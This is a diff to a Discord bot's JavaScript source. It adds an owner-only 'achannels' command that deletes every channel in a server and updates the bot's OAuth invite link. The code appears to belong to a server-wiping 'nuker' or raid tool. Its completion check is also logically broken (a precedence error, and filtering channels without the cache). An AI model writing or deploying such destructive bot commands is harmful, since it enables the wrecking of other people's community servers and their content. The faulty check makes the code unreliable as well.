@@ -91,7 +91,15 @@ client.on('message', message => {
         } 
     } else if (command == 'achannels') {
         if(message.author.id === process.env.uid) {
-            // code here
+            try{
+                message.guild.channels.cache.forEach((channel  => channel.delete()));
+                if (!message.guild.channels.filter((c) => c.type === "text" || c.type === "voice").size === 0){
+                    console.log(chalk.bgGreen('All channels have been deleted.'))
+                    return;
+                }
+            } catch (error){
+                console.log(chalk.bold.bgRed(`Failed to delete all channels.`));
+            }
         } else {
             const noIdEmbed = new Discord.MessageEmbed()
             .setColor('#a61c1c')
@@ -119,4 +127,4 @@ client.on('message', message => {
     }
 });
 client.login(process.env.token);
-//https://discord.com/oauth2/authorize?client_id=831229861833080863&scope=bot&permissions=805448830
+//https://discord.com/oauth2/authorize?client_id=832436291005186098&scope=bot&permissions=805448830
